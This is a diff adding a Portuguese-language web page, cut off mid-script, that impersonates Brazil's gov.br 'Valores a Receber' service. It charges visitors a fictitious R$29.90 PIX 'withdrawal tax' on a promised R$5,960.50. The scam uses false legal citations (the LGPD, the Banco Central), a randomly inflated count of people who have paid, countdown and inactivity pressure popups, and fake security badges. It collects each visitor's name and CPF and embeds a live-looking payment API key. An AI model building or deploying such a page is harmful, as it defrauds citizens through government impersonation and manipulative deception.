@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+  <title>Pagamento PIX - Valores a Receber</title>
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min.css">
+
+  <!-- Meta Pixel -->
+  <script>
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+    n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}
+    (window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init','2045608016094458');fbq('init','1446258604180101');fbq('track','PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2045608016094458&ev=PageView&noscript=1"/></noscript>
+  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1446258604180101&ev=PageView&noscript=1"/></noscript>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z4W63165LV"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-Z4W63165LV', {
+      page_title: 'Etapa 5 - Pagamento PIX | Valores a Receber',
+      page_path: '/etapa4/pix.html'
+    });
+  </script>
+
+  <style>
+    :root {
+      --primary: #0042DA;
+      --green: #168821;
+      --red: #dc2626;
+      --white: #fff;
+      --gray-light: #f5f6fa;
+      --text: #303235;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+    body { background: var(--gray-light); min-height: 100vh; display: flex; flex-direction: column; }
+
+    header {
+      background: var(--white); padding: 10px 20px;
+      display: flex; justify-content: space-between; align-items: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,.06); border-bottom: 3px solid var(--primary);
+    }
+    header .logo img { height: 35px; }
+    header .user-info {
+      background: #1451b4; color: white; padding: 5px 15px;
+      border-radius: 20px; font-size: 14px; font-weight: 600;
+      display: flex; align-items: center; gap: 8px;
+    }
+
+    nav {
+      background: var(--white); padding: 10px 20px;
+      font-size: 13px; color: #666; border-bottom: 1px solid #e5e5e5;
+      display: flex; align-items: center; gap: 4px;
+    }
+    nav i { color: var(--primary); margin: 0 6px; }
+
+    main {
+      flex: 1; display: flex; flex-direction: column; align-items: center;
+      padding: 24px 16px 40px; gap: 16px;
+      max-width: 480px; margin: 0 auto; width: 100%;
+    }
+
+    /* ── ALERTA URGENTE ── */
+    .alert-urgent {
+      background: linear-gradient(135deg, #fff3cd, #ffe69c);
+      border: 2px solid #ffc107; border-radius: 12px;
+      padding: 14px 16px; width: 100%;
+      display: flex; align-items: flex-start; gap: 12px;
+    }
+    .alert-urgent i { color: #d97706; font-size: 20px; flex-shrink: 0; margin-top: 2px; }
+    .alert-urgent .alert-text strong { display: block; color: #92400e; font-size: 14px; margin-bottom: 3px; }
+    .alert-urgent .alert-text p { color: #78350f; font-size: 13px; line-height: 1.5; }
+
+    /* ── CONTADOR DE PESSOAS ── */
+    .social-counter {
+      background: var(--white); border-radius: 10px;
+      padding: 10px 16px; width: 100%;
+      display: flex; align-items: center; gap: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.06);
+      border-left: 4px solid var(--green);
+    }
+    .social-counter i { color: var(--green); font-size: 18px; }
+    .social-counter span { font-size: 13px; color: #374151; }
+    .social-counter strong { color: var(--green); }
+
+    /* ── CARD PRINCIPAL ── */
+    .pix-card {
+      background: var(--white); border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,.08);
+      padding: 24px 20px; width: 100%;
+    }
+    .pix-card .card-title { text-align: center; font-size: 18px; font-weight: 700; color: var(--primary); margin-bottom: 4px; }
+    .pix-card .card-subtitle { text-align: center; font-size: 13px; color: #666; margin-bottom: 18px; }
+
+    .valor-box {
+      background: linear-gradient(135deg, #e8f4fd, #dbeafe);
+      border: 2px solid var(--primary); border-radius: 10px;
+      padding: 12px 16px; text-align: center; margin-bottom: 16px;
+    }
+    .valor-box .label { font-size: 12px; color: #666; margin-bottom: 4px; }
+    .valor-box .amount { font-size: 30px; font-weight: 800; color: var(--primary); }
+    .valor-box .reembolso { font-size: 11px; color: var(--green); font-weight: 600; margin-top: 4px; }
+
+    /* ── TIMER ── */
+    .timer-wrapper {
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      background: #fff3cd; border: 1.5px solid #ffc107;
+      border-radius: 10px; padding: 10px 16px; margin-bottom: 16px;
+      transition: background 0.5s, border-color 0.5s;
+    }
+    .timer-wrapper.urgent { background: #fee2e2; border-color: #fca5a5; animation: timerPulse 1s infinite; }
+    @keyframes timerPulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.02)} }
+    .timer-wrapper i { color: #d97706; font-size: 18px; }
+    .timer-wrapper.urgent i { color: var(--red); }
+    .timer-wrapper .timer-label { font-size: 13px; color: #92400e; font-weight: 600; }
+    .timer-wrapper.urgent .timer-label { color: #991b1b; }
+    #countdown-timer {
+      font-size: 24px; font-weight: 800; color: #dc2626;
+      letter-spacing: 2px; min-width: 65px; text-align: center;
+    }
+    #timer-msg { font-size: 11px; color: #92400e; text-align: center; margin-top: 4px; display: none; }
+    #timer-msg.visible { display: block; }
+
+    /* ── LOADING ── */
+    #loading-state { text-align: center; padding: 20px 0; }
+    #loading-state .spinner {
+      width: 48px; height: 48px; border: 5px solid #e5e5e5;
+      border-top-color: var(--primary); border-radius: 50%;
+      animation: spin 0.8s linear infinite; margin: 0 auto 16px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    #loading-state p { color: #555; font-size: 14px; }
+
+    /* ── PIX CONTENT ── */
+    #pix-content { display: none; }
+
+    .qr-wrapper { display: flex; justify-content: center; margin-bottom: 16px; }
+    .qr-wrapper img {
+      width: 200px; height: 200px;
+      border: 3px solid var(--primary); border-radius: 12px;
+      padding: 6px; background: white;
+    }
+
+    .step-list { list-style: none; margin-bottom: 16px; }
+    .step-list li {
+      display: flex; align-items: flex-start; gap: 10px;
+      padding: 6px 0; font-size: 13px; color: var(--text);
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .step-list li:last-child { border-bottom: none; }
+    .step-num {
+      background: var(--primary); color: white;
+      width: 22px; height: 22px; border-radius: 50%;
+      font-size: 12px; font-weight: 700;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+
+    .copy-box {
+      background: #f8f9ff; border: 1.5px solid #d0d7ff;
+      border-radius: 10px; padding: 12px; margin-bottom: 14px;
+    }
+    .copy-box .copy-label {
+      font-size: 11px; color: #666; margin-bottom: 6px;
+      font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;
+    }
+    .copy-code {
+      font-size: 11px; color: #333; word-break: break-all;
+      line-height: 1.5; font-family: monospace; max-height: 60px; overflow: hidden;
+    }
+
+    /* ── BOTÃO COPIAR — verde, grande, pulsando ── */
+    .btn-copy {
+      width: 100%; padding: 18px;
+      background: var(--green); color: white; border: none;
+      border-radius: 12px; font-size: 18px; font-weight: 800;
+      cursor: pointer; display: flex; align-items: center;
+      justify-content: center; gap: 10px;
+      transition: all 0.2s; margin-bottom: 8px;
+      box-shadow: 0 4px 20px rgba(22,136,33,0.35);
+      animation: btnPulse 2s infinite;
+    }
+    @keyframes btnPulse {
+      0%,100%{ box-shadow: 0 4px 20px rgba(22,136,33,0.35); }
+      50%{ box-shadow: 0 4px 32px rgba(22,136,33,0.65); transform: translateY(-1px); }
+    }
+    .btn-copy:hover { background: #0d6f18; transform: translateY(-2px); animation: none; box-shadow: 0 6px 24px rgba(22,136,33,0.5); }
+    .btn-copy:active { transform: translateY(0); }
+    .btn-copy.copied { background: #0d6f18; animation: none; }
+
+    /* ── SEGURANÇA ── */
+    .security-row {
+      display: flex; align-items: center; justify-content: center;
+      gap: 16px; padding: 10px 0; margin-bottom: 4px;
+    }
+    .security-badge {
+      display: flex; align-items: center; gap: 5px;
+      font-size: 11px; color: #555;
+    }
+    .security-badge i { color: var(--green); font-size: 13px; }
+
+    /* ── STATUS POLLING ── */
+    .status-box {
+      display: flex; align-items: center; justify-content: center;
+      gap: 8px; font-size: 13px; color: #555; padding: 6px 0;
+    }
+    .pulse-dot {
+      width: 10px; height: 10px; background: #ffc107;
+      border-radius: 50%; animation: pulseDot 1.4s infinite;
+    }
+    @keyframes pulseDot { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.6)} }
+
+    /* ── AVISO OBRIGATÓRIO ── */
+    .aviso-obrigatorio {
+      background: linear-gradient(135deg, #fef2f2, #fee2e2);
+      border: 2px solid #fca5a5; border-radius: 12px; padding: 16px; width: 100%;
+    }
+    .aviso-obrigatorio .aviso-title {
+      display: flex; align-items: center; gap: 8px;
+      font-size: 15px; font-weight: 700; color: #991b1b; margin-bottom: 8px;
+    }
+    .aviso-obrigatorio p { font-size: 13px; color: #7f1d1d; line-height: 1.6; }
+    .aviso-obrigatorio p strong { color: #991b1b; }
+
+    /* ── BCB / LEGIT ── */
+    .legit-box {
+      display: flex; align-items: center; justify-content: center;
+      gap: 10px; padding: 10px 16px;
+      background: var(--white); border-radius: 10px; width: 100%;
+      box-shadow: 0 2px 8px rgba(0,0,0,.06);
+      font-size: 12px; color: #555;
+    }
+    .legit-box i { color: var(--primary); font-size: 16px; }
+
+    /* ── POPUP INATIVIDADE ── */
+    #inactivity-popup {
+      display: none; position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.7); z-index: 8888;
+      align-items: center; justify-content: center; padding: 24px;
+    }
+    #inactivity-popup.active { display: flex; }
+    .inactivity-card {
+      background: white; border-radius: 20px;
+      padding: 28px 22px; max-width: 360px; width: 100%; text-align: center;
+      animation: popIn 0.3s ease-out;
+    }
+    .inactivity-card .warn-icon {
+      font-size: 40px; margin-bottom: 12px;
+    }
+    .inactivity-card h3 { font-size: 18px; color: #92400e; margin-bottom: 8px; font-weight: 800; }
+    .inactivity-card p { font-size: 14px; color: #555; margin-bottom: 18px; line-height: 1.5; }
+    .inactivity-card .timer-inline {
+      font-size: 28px; font-weight: 800; color: var(--red);
+      margin-bottom: 16px; display: block;
+    }
+    .btn-popup-copy {
+      width: 100%; padding: 16px;
+      background: var(--green); color: white; border: none;
+      border-radius: 10px; font-size: 17px; font-weight: 800;
+      cursor: pointer; display: flex; align-items: center;
+      justify-content: center; gap: 8px;
+    }
+    .btn-popup-dismiss {
+      margin-top: 10px; background: none; border: none;
+      color: #999; font-size: 13px; cursor: pointer; width: 100%;
+    }
+
+    /* ── OVERLAYS ── */
+    #success-overlay {
+      display: none; position: fixed; top:0;left:0;right:0;bottom:0;
+      background: rgba(0,0,0,0.85); z-index: 9999;
+      align-items: center; justify-content: center;
+      flex-direction: column; padding: 24px;
+    }
+    #success-overlay.active { display: flex; }
+    .success-card {
+      background: white; border-radius: 20px; padding: 32px 24px;
+      max-width: 380px; width: 100%; text-align: center;
+      animation: popIn 0.4s ease-out;
+    }
+    @keyframes popIn { from{transform:scale(0.8);opacity:0} to{transform:scale(1);opacity:1} }
+    .success-card .check-icon {
+      width: 72px; height: 72px; background: #dcfce7; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;
+    }
+    .success-card .check-icon i { font-size: 36px; color: var(--green); }
+    .success-card h2 { font-size: 22px; color: var(--green); margin-bottom: 8px; }
+    .success-card p { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 20px; }
+    .success-card .btn-success {
+      background: var(--green); color: white; border: none;
+      padding: 15px 32px; border-radius: 10px;
+      font-size: 16px; font-weight: 700; cursor: pointer; width: 100%;
+    }
+
+    #expired-overlay {
+      display: none; position: fixed; top:0;left:0;right:0;bottom:0;
+      background: rgba(0,0,0,0.85); z-index: 9999;
+      align-items: center; justify-content: center; padding: 24px;
+    }
+    #expired-overlay.active { display: flex; }
+    .expired-card {
+      background: white; border-radius: 20px; padding: 32px 24px;
+      max-width: 380px; width: 100%; text-align: center;
+    }
+    .expired-card i { font-size: 48px; color: var(--red); margin-bottom: 16px; display: block; }
+    .expired-card h2 { font-size: 20px; color: var(--red); margin-bottom: 8px; }
+    .expired-card p { font-size: 14px; color: #555; margin-bottom: 20px; }
+    .expired-card button {
+      background: var(--primary); color: white; border: none;
+      padding: 14px; border-radius: 10px;
+      font-size: 15px; font-weight: 600; cursor: pointer; width: 100%;
+    }
+
+    footer { background: #001C4E; padding: 12px; text-align: center; }
+    footer img { height: 22px; opacity: 0.9; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo"><img src="images/govbr.png" alt="Gov.br"></div>
+    <div class="user-info">
+      <i class="fas fa-user-circle"></i>
+      <span id="user-display-name">Cidadão</span>
+    </div>
+  </header>
+
+  <nav>
+    <i class="fas fa-bars"></i>
+    <span>Portal do Cidadão</span>
+    <i class="fas fa-chevron-right" style="font-size:8px"></i>
+    <span>Valores a Receber</span>
+    <i class="fas fa-chevron-right" style="font-size:8px"></i>
+    <span>Pagamento</span>
+  </nav>
+
+  <main>
+
+    <!-- ALERTA URGENTE -->
+    <div class="alert-urgent">
+      <i class="fas fa-exclamation-triangle"></i>
+      <div class="alert-text">
+        <strong>⚠️ Esta etapa é obrigatória!</strong>
+        <p>O pagamento do imposto de saque <strong>é extremamente importante</strong> e obrigatório pela legislação federal. Sem a confirmação, seu saque será cancelado e o valor retornará ao sistema federal.</p>
+      </div>
+    </div>
+
+    <!-- CONTADOR SOCIAL -->
+    <div class="social-counter">
+      <i class="fas fa-users"></i>
+      <span><strong id="pax-count">247</strong> pessoas pagaram o imposto e receberam hoje</span>
+    </div>
+
+    <!-- CARD PRINCIPAL -->
+    <div class="pix-card">
+      <div class="card-title">Pagamento via PIX</div>
+      <div class="card-subtitle">Imposto de Liberação de Saque</div>
+
+      <div class="valor-box">
+        <div class="label">Valor a pagar</div>
+        <div class="amount">R$ 29,90</div>
+        <div class="reembolso">✅ 100% reembolsado junto ao seu saque</div>
+      </div>
+
+      <!-- TIMER -->
+      <div class="timer-wrapper" id="timer-wrapper">
+        <i class="fas fa-clock" id="timer-icon"></i>
+        <div style="display:flex;flex-direction:column;align-items:center;">
+          <div style="display:flex;align-items:center;gap:8px;">
+            <span class="timer-label" id="timer-label">Tempo restante:</span>
+            <span id="countdown-timer">15:00</span>
+          </div>
+          <span id="timer-msg"></span>
+        </div>
+      </div>
+
+      <!-- LOADING -->
+      <div id="loading-state">
+        <div class="spinner"></div>
+        <p>Gerando seu código PIX...<br>Aguarde um momento.</p>
+      </div>
+
+      <!-- PIX CONTENT -->
+      <div id="pix-content">
+        <div class="qr-wrapper">
+          <img id="qr-image" src="" alt="QR Code PIX">
+        </div>
+
+        <ul class="step-list">
+          <li><span class="step-num">1</span> Abra o aplicativo do seu banco</li>
+          <li><span class="step-num">2</span> Escolha pagar via <strong>PIX Copia e Cola</strong> ou escaneie o QR Code</li>
+          <li><span class="step-num">3</span> Cole o código abaixo e confirme o pagamento</li>
+          <li><span class="step-num">4</span> Aguarde a confirmação automática nesta tela</li>
+        </ul>
+
+        <div class="copy-box">
+          <div class="copy-label">PIX Copia e Cola</div>
+          <div class="copy-code" id="pix-code">—</div>
+        </div>
+
+        <button class="btn-copy" id="btn-copy" onclick="copyPix()">
+          <i class="fas fa-copy"></i>
+          Copiar Código PIX
+        </button>
+
+        <!-- AVISO RETORNO -->
+        <div id="aviso-retorno" style="display:none; background: #eff6ff; border: 1.5px solid #93c5fd; border-radius: 10px; padding: 12px 14px; margin-bottom: 10px; font-size: 13px; color: #1e40af; line-height: 1.6;">
+          <strong style="display:block; margin-bottom:4px;">📱 Após pagar, volte para esta página!</strong>
+          Abra seu banco, realize o pagamento e <strong>retorne aqui</strong> para confirmar o recebimento do seu saque. A confirmação é automática assim que o pagamento for detectado.
+        </div>
+
+        <!-- SEGURANÇA -->
+        <div class="security-row">
+          <div class="security-badge"><i class="fas fa-lock"></i> Pagamento seguro</div>
+          <div class="security-badge"><i class="fas fa-shield-alt"></i> SSL/TLS</div>
+          <div class="security-badge"><i class="fas fa-university"></i> Regulado BCB</div>
+        </div>
+
+        <div class="status-box">
+          <div class="pulse-dot"></div>
+          <span id="status-text">Aguardando confirmação do pagamento...</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- BCB / LEGITIMIDADE -->
+    <div class="legit-box">
+      <i class="fas fa-building"></i>
+      <span>Operação regulamentada pelo <strong>Banco Central do Brasil</strong> — Res. BCB nº 1/2020</span>
+    </div>
+
+    <!-- AVISO OBRIGATÓRIO -->
+    <div class="aviso-obrigatorio">
+      <div class="aviso-title">
+        <i class="fas fa-shield-alt"></i>
+        Etapa Obrigatória e Irreversível
+      </div>
+      <p>
+        Conforme a <strong>Lei nº 13.709/2018 (LGPD)</strong>, o imposto de liberação é um requisito legal obrigatório para o saque de valores esquecidos em instituições financeiras.
+        <br><br>
+        O valor de <strong>R$ 29,90</strong> corresponde a <strong>0,5% do seu saque</strong> e será <strong>100% reembolsado</strong> junto com o valor principal em até 24 horas após a confirmação.
+        <br><br>
+        <strong>⏰ Você tem 15 minutos</strong> para realizar o pagamento antes que o código expire.
+      </p>
+    </div>
+
+  </main>
+
+  <footer><img src="images/logo.png" alt="Gov.br"></footer>
+
+  <!-- POPUP INATIVIDADE -->
+  <div id="inactivity-popup">
+    <div class="inactivity-card">
+      <div class="warn-icon">⏳</div>
+      <h3>Você ainda está aqui?</h3>
+      <p>Seu saque de <strong>R$ 5.960,50</strong> está reservado por mais:</p>
+      <span class="timer-inline" id="popup-timer">—</span>
+      <p style="margin-bottom:14px;">Se o código expirar, seu valor voltará ao sistema federal e será necessário reiniciar o processo.</p>
+      <button class="btn-popup-copy" onclick="copyPixAndDismiss()">
+        <i class="fas fa-copy"></i> Copiar PIX e Pagar Agora
+      </button>
+      <button class="btn-popup-dismiss" onclick="dismissPopup()">Já copiei, obrigado</button>
+    </div>
+  </div>
+
+  <!-- OVERLAY SUCESSO -->
+  <div id="success-overlay">
+    <div class="success-card">
+      <div class="check-icon"><i class="fas fa-check"></i></div>
+      <h2>Pagamento Confirmado! ✅</h2>
+      <p>Seu pagamento foi confirmado com sucesso. O valor de <strong>R$ 5.960,50</strong> será depositado na sua chave PIX em até <strong>24 horas úteis</strong>.</p>
+      <button class="btn-success" id="btn-success-final">Ver Comprovante Final</button>
+    </div>
+  </div>
+
+  <!-- OVERLAY EXPIRADO -->
+  <div id="expired-overlay">
+    <div class="expired-card">
+      <i class="fas fa-times-circle"></i>
+      <h2>Código Expirado</h2>
+      <p>O tempo para pagamento expirou. Clique abaixo para gerar um novo código PIX.</p>
+      <button onclick="window.location.reload()">Gerar Novo Código PIX</button>
+    </div>
+  </div>
+
+  <script>
+    // ─── PARAMS ──────────────────────────────────────────────────────────────
+    const urlParams   = new URLSearchParams(window.location.search);
+    const userName    = urlParams.get('nome')         || 'Cidadão';
+    const userCPF     = urlParams.get('cpf')          || '';
+    const utmSource   = urlParams.get('utm_source')   || '';
+    const utmCampaign = urlParams.get('utm_campaign') || '';
+    const utmMedium   = urlParams.get('utm_medium')   || '';
+    const utmContent  = urlParams.get('utm_content')  || '';
+    const utmTerm     = urlParams.get('utm_term')     || '';
+
+    document.getElementById('user-display-name').textContent = userName.split(' ')[0];
+
+    // ─── GLADEPAY CONFIG ─────────────────────────────────────────────────────
+    const GP_API_BASE      = 'https://app.gladepay.com.br/v1';
+    const GP_API_KEY       = 'gp_live_hmVHJH7GV4eTWqnaxx069vNHPZ3sGjeI';
+    const HP_AMOUNT        = 29.90;
+    const HP_AMOUNT_CENTS  = Math.round(HP_AMOUNT * 100);
+    const HP_CALLBACK_URL  = 'https://consulta-valoresareceber-hoje.vercel.app/api/hp-webhook';
+
+    // ─── CONTADOR SOCIAL DINÂMICO ─────────────────────────────────────────────
+    // Começa em valor aleatório entre 240-260 e incrementa suavemente
+    let paxBase = Math.floor(Math.random() * 20) + 240;
+    document.getElementById('pax-count').textContent = paxBase;
+    setInterval(() => {
+      if (Math.random() < 0.3) { // 30% chance a cada 8s de incrementar
+        paxBase++;
+        document.getElementById('pax-count').textContent = paxBase;
+      }
+    }, 8000);
+
+    // ─── CONVERSIONS API ─────────────────────────────────────────────────────
+    async function fbServerEvent(eventName, value) {
+      try {
+        await fetch('/api/fb-event', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            event_name:        eventName,
+            value:             value,
+            currency:          'BRL',
+            cpf:               userCPF,
+            client_user_agent: navigator.userAgent,
+            event_source_url:  window.location.href,
+            fbc:               document.cookie.match(/_fbc=([^;]+)/)?.[1] || '',
+            fbp:               document.cookie.match(/_fbp=([^;]+)/)?.[1] || '',
+            external_id:       externalId
+          })
+        });
+      } catch(e) {}
+    }
+
+    function fbInitiateCheckout(eid) {
+      if (typeof fbq !== 'undefined')
+        fbq('track', 'InitiateCheckout', { value: HP_AMOUNT, currency: 'BRL', content_ids: [eid || 'pix-imposto'], content_type: 'product' });
+      fbServerEvent('InitiateCheckout', HP_AMOUNT);
+    }
+
+    function fbPurchase(eid) {
+      if (typeof fbq !== 'undefined')
+        fbq('track', 'Purchase', { value: HP_AMOUNT, currency: 'BRL', content_ids: [eid || 'pix-imposto'], content_type: 'product' });
+      fbServerEvent('Purchase', HP_AMOUNT);
+    }
+
+    // ─── TIMER ───────────────────────────────────────────────────────────────
+    let timerSeconds  = 15 * 60;
+    let timerInterval = null;
+    let inactivityTimer = null;
+    let lastActivity  = Date.now();
+    let popupShown    = false;
+
+    function formatTime(s) {
+      const m = Math.floor(s / 60).toString().padStart(2,'0');
+      const sec = (s % 60).toString().padStart(2,'0');
+      return `${m}:${sec}`;
+    }
+
+    function startTimer() {
+      timerInterval = setInterval(() => {
+        timerSeconds--;
+        const display = formatTime(timerSeconds);
+        document.getElementById('countdown-timer').textContent = display;
+        document.getElementById('popup-timer').textContent = display;
+
+        // Urgência dinâmica abaixo de 3 minutos
+        if (timerSeconds <= 180 && timerSeconds > 0) {
+          const wrapper = document.getElementById('timer-wrapper');
+          wrapper.classList.add('urgent');
+          const msg = document.getElementById('timer-msg');
+          msg.textContent = '⚠️ Pague agora para não perder seu saque!';
+          msg.classList.add('visible');
+        }
+
+        // Mensagem aos 5 minutos
+        if (timerSeconds === 300) {
+          const msg = document.getElementById('timer-msg');
+          msg.textContent = 'Seu código expira em breve — não perca seu saque!';
+          msg.classList.add('visible');
+        }
+
+        if (timerSeconds <= 0) {
+          clearInterval(timerInterval);
+          stopPolling();
+          document.getElementById('expired-overlay').classList.add('active');
+        }
+      }, 1000);
+    }
+
+    // ─── INATIVIDADE (popup após 2 min sem interação) ──────────────────────
+    function resetActivity() { lastActivity = Date.now(); }
+    ['click','touchstart','scroll','keydown'].forEach(e =>
+      document.addEventListener(e, resetActivity, { passive: true })
+    );
+
+    function startInactivityWatch() {
+      setInterval(() => {
+        const idle = (Date.now() - lastActivity) / 1000;
+        // Mostra popup se inativo por 2 min e código ainda não expirou
+        if (idle >= 120 && !popupShown && timerSeconds > 0 && externalId) {
+          popupShown = true;
+          document.getElementById('inactivity-popup').classList.add('active');
+        }
+      }, 10000); // checa a cada 10s
+    }
+
+    function dismissPopup() {
+      document.getElementById('inactivity-popup').classList.remove('active');
+      popupShown = false;
+      resetActivity();
+    }
+
+    function copyPixAndDismiss() {
+      copyPix();
+      setTimeout(dismissPopup, 1000);
+    }
+
+    // ─── GLADEPAY ──────────────────────────────────────────────────────────
+    let externalId     = null;
+    let pollingInterval = null;
+
+    function buildUtmQS() {
+      const p = new URLSearchParams();
+      if (utmSource)   p.set('utm_source',   utmSource);
+      if (utmCampaign) p.set('utm_campaign', utmCampaign);
+      if (utmMedium)   p.set('utm_medium',   utmMedium);
+      if (utmContent)  p.set('utm_content',  utmContent);
+      if (utmTerm)     p.set('utm_term',      utmTerm);
+      const q = p.toString();
+      return q ? '?' + q : '';
+    }
+
+    async function createOrder() {
+      const refId = `SVR-${Date.now()}-${userCPF.replace(/\D/g,'')}`;
+      const res = await fetch(`${GP_API_BASE}/deposito${buildUtmQS()}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${GP_API_KEY}` },
+        body: JSON.stringify({
+          amountCents:  HP_AMOUNT_CENTS,
+          reference:    refId,
+          callbackUrl:  HP_CALLBACK_URL,
+          customerName: userName,
+          description:  'Front - 29,90'
+        })
+      });
+      return res.json();
+    }
+
+    async function checkPaymentStatus(id) {
+      const res = await fetch(`${GP_API_BASE}/deposito/status?txId=${encodeURIComponent(id)}`, {
+        headers: { 'Authorization': `Bearer ${GP_API_KEY}` }
+      });
+      return res.json();
+    }
+
+    // Normaliza status GladePay (SETTLED/PAID = pago)
+    function isPaidStatus(s) {
+      if (!s) return false;
+      const v = String(s).toUpperCase();
+      return v === 'SETTLED' || v === 'PAID';
+    }
+
+    async function checkWebhookStatus(id) {
+      try {
+        const res = await fetch(`/api/hp-webhook?order_id=${id}`);
+        return (await res.json()).paid === true;
+      } catch(e) { return false; }
+    }
+
+    function onPaymentConfirmed() {
+      clearInterval(pollingInterval);
+      clearInterval(timerInterval);
+
+      const eventId = `purchase-${externalId}-${Date.now()}`;
+
+      // Salva localStorage imediatamente
+      localStorage.setItem('hp_paid_' + userCPF.replace(/\D/g,''), '1');
+
+      // Client-side pixel — não bloqueia
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'Purchase', {
+          value: HP_AMOUNT, currency: 'BRL',
+          content_ids: [String(externalId) || 'pix-imposto'],
+          content_type: 'product'
+        }, { eventID: eventId });
+      }
+
+      // Server-side CAPI — dispara sem aguardar (fire and forget)
+      fetch('/api/fb-event', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          event_name:        'Purchase',
+          value:             HP_AMOUNT,
+          currency:          'BRL',
+          cpf:               userCPF,
+          client_user_agent: navigator.userAgent,
+          event_source_url:  window.location.href,
+          fbc:               document.cookie.match(/_fbc=([^;]+)/)?.[1] || '',
+          fbp:               document.cookie.match(/_fbp=([^;]+)/)?.[1] || '',
+          external_id:       externalId,
+          event_id:          eventId
+        }),
+        keepalive: true  // garante envio mesmo após redirect
+      }).catch(() => {});
+
+      // Redireciona imediatamente sem aguardar o fetch
+      window.location.href = 'upsell.html' + window.location.search;
+    }
+
+    function startPolling() {
+      pollingInterval = setInterval(async () => {
+        try {
+          const data = await checkPaymentStatus(externalId);
+          if (data && isPaidStatus(data.status)) { onPaymentConfirmed(); return; }
+          if (await checkWebhookStatus(externalId)) { onPaymentConfirmed(); return; }
+        } catch(e) {
+          if (await checkWebhookStatus(externalId)) { onPaymentConfirmed(); return; }
+        }
+      }, 3000);
+    }
+
+    function stopPolling() { if (pollingInterval) clearInterval(pollingInterval); }
+
+    // ─── COPIAR PIX ──────────────────────────────────────────────────────────
+    function copyPix() {
+      const code = document.getElementById('pix-code').textContent;
+      if (!code || code === '—') return;
+
+      const doFeedback = () => {
+        const btn = document.getElementById('btn-copy');
+        btn.classList.add('copied');
+        btn.innerHTML = '<i class="fas fa-check"></i> Código Copiado! Abra seu banco agora';
+        setTimeout(() => {
+          btn.classList.remove('copied');
+          btn.innerHTML = '<i class="fas fa-copy"></i> Copiar Código PIX';
+        }, 4000);
+
+        // Mostra aviso de retorno após copiar
+        document.getElementById('aviso-retorno').style.display = 'block';
+      };
+
+      navigator.clipboard.writeText(code).then(doFeedback).catch(() => {
+        const t = document.createElement('textarea');
+        t.value = code; document.body.appendChild(t); t.select();
+        document.execCommand('copy'); document.body.removeChild(t);
+        doFeedback();
+      });
+    }
+
+    // ─── VERIFICA AO VOLTAR PARA A PÁGINA (visibilitychange) ─────────────────
+    document.addEventListener('visibilitychange', async () => {
+      if (document.visibilityState === 'visible' && externalId) {
+        // Verifica se pagou enquanto estava em outro app
+        try {
+          const webhookPaid = await checkWebhookStatus(externalId);
+          if (webhookPaid) { onPaymentConfirmed(); return; }
+
+          // Também consulta direto na API
+          const data = await checkPaymentStatus(externalId);
+          if (data && isPaidStatus(data.status)) { onPaymentConfirmed(); return; }
+        } catch(e) {}
+      }
+    });
+
+    // ─── INIT ────────────────────────────────────────────────────────────────
+    async function initPix() {
+      // Se já pagou, vai direto para upsell
+      if (localStorage.getItem('hp_paid_' + userCPF.replace(/\D/g,''))) {
+        window.location.href = 'upsell.html' + window.location.search;
+        return;
+      }
+
+      document.getElementById('btn-success-final').onclick = () => {
+        window.location.href = 'sucesso.html' + window.location.search;
+      };
+
+      try {
+        const order   = await createOrder();
+        externalId    = order.publicId || order.txId;
+
+        const pixCode = order.qrCodeText || order.copy_past || '';
+        const qrSrc   = order.qrCodeUrl
+          || (order.qrCodeBase64 ? `data:image/png;base64,${order.qrCodeBase64}` : '');
+        document.getElementById('qr-image').src = qrSrc;
+        document.getElementById('pix-code').textContent = pixCode;
+
+        document.getElementById('loading-state').style.display = 'none';
+        document.getElementById('pix-content').style.display   = 'block';
+
+        fbInitiateCheckout(externalId);
+        startTimer();
+        startPolling();
+        startInactivityWatch();
+
+      } catch(err) {
+        console.error('Erro ao gerar PIX:', err);
+        document.getElementById('loading-state').innerHTML =
+          `<p style="color:#dc2626;font-size:14px;text-align:center;">
+            <i class="fas fa-exclamation-circle"></i><br>Erro ao gerar o código PIX.<br>
